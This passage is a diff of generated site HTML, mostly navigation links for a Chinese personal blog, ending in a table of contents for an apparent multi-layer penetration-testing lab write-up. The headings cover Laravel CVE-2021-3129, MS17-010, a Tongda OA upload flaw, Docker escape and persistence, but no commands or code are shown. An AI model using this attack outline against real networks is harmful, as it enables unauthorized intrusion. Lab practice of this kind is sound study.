+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📝 每周计划
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/study-plan/summer-plan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    暑期计划
+  
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--进行中"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/study-plan/week5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第二阶段第一周
+  
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--进行中"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/journal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📔 随笔日记
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/struggles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💭 烦恼记录
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../life/wins/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎉 成就时刻
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🎉 成就时刻
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../life/reflections/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔄 思考记录
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🔄 思考记录
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/reflections/%E7%A0%B4%E9%A2%98%E4%B9%8B%E4%BD%99-%E4%BA%A6%E7%A0%B4%E5%BF%83%E9%9A%9C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ctf赛后复盘
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/reflections/%E7%B3%BB%E7%BB%9F%E5%86%85%E9%83%A8%EF%BC%8C%E6%B8%85%E9%86%92%E8%BE%B9%E7%BC%98/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    系统内部，清醒边缘
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/reflections/%E6%A1%A5%E7%9A%84%E8%93%9D%E5%9B%BE%EF%BC%9A%E4%BB%8E%E7%AC%AC%E4%B8%80%E5%9D%97%E7%A0%96%E5%88%B0%E5%BC%80%E6%BA%90%E6%A1%86%E6%9E%B6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    桥的蓝图：从第一块砖到开源框架
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/reflections/%E4%BB%8E%E4%BF%AF%E8%A7%86%E5%88%B0%E5%B9%B3%E8%A7%86%EF%BC%9A%E4%B8%80%E4%BB%BD%E5%86%85%E5%BF%83%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    从俯视到平视：一份内心笔记
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/reflections/%E4%BB%A5%E6%80%9D%E5%BC%80%E8%B7%AF%EF%BC%8C%E4%BB%A5%E8%B7%AF%E8%BD%BD%E5%85%89/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    以思开路，以路载光
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/reflections/LINK%E6%B5%AE%E7%8E%B0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    LINK浮现
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_7" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../life/family-letters/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💌 父母寄语
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_7" id="__nav_3_7_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💌 父母寄语
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/family-letters/%E5%88%9D%E5%8D%87%E9%AB%98_%E7%88%B6%E4%BA%B2%E5%AF%84%E8%AF%AD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    初升高_父亲寄语
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/family-letters/%E6%88%90%E4%BA%BA%E7%A4%BC_%E7%88%B6%E6%AF%8D%E5%AF%84%E8%AF%AD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    成人礼_父母寄语
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_8" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../life/portrait/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🖼️ 个人画像
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_8" id="__nav_3_8_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🖼️ 个人画像
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/portrait/%E7%94%BB%E7%BA%A6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    画像师约定
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../life/portrait/%E8%A7%81%E5%B7%B1-%E7%83%9B%E7%85%A7-2026.7.2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    烛照之作
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    修桥工程
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    修桥工程
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_1" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../bridge/novel/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    《临风行》
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4_1" id="__nav_4_1_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    《临风行》
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../bridge/novel/volume1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第一卷
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../bridge/novel/volume2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第二卷
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../bridge/novel/volume3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第三卷
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../updates/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    动态推送
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    动态推送
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📦 全部动态
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../spiritual/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    精神食粮
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_6" id="__nav_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    精神食粮
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../spiritual/images/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🖼️ 照片
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🖼️ 照片
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../spiritual/music/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎵 音乐
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🎵 音乐
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../spiritual/sentences/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    💬 句子
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    💬 句子
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../../../about/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    关于本站
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_7" id="__nav_7_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    关于本站
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../about/why/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    为什么建这个站
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../../role-panel/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ❗️ 角色档案
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        环境搭建
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="环境搭建">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        网络拓扑
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        网卡设置
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        主机配置
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        服务配置
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kalidmzweb1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        外网kali——&gt;DMZ区Web1
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="外网kali——&gt;DMZ区Web1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        外网主机探测
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞利用+权限维持
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csweb1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CS监听Web1（直连）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kaliweb2pc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        kali——&gt;二层web2、PC1
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="kali——&gt;二层web2、PC1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        设置代理转发
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        web2
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="web2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞探测
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞利用
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞利用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#msf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        msf
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#secpros-teamlaravel-cve-2021-3129-exp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SecPros-Team/laravel-CVE-2021-3129-EXP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ajisai-babucve-2021-3129-exp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ajisai-babu/CVE-2021-3129-exp
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        提权
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="提权">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#suid" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        suid+环境变量提权
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#docker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Docker逃逸
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        权限维持
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pc1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        pc1
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="pc1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞探测
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞探测">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#445" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        发现445端口开放，可能存在永恒之蓝
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#8080http" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8080端口的http服务可能存在漏洞
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞利用
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞利用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ms17-010pc1shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MS17-010永恒之蓝拿下PC1的shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#oapc1shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        通达OA未授权任意文件上传漏洞拿下PC1的shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        横向移动
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kalipc2dc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        kali——&gt;三层PC2、DC（内网渗透/横向移动）
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="kali——&gt;三层PC2、DC（内网渗透/横向移动）">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        配置代理隧道
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        内网信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pc2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PC2
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PC2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞探测
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞利用
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DC
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DC">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞探测
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞利用
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#msf_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        msf上线
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        持久化
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="持久化">
+      <ul class="md-nav__list">
+        
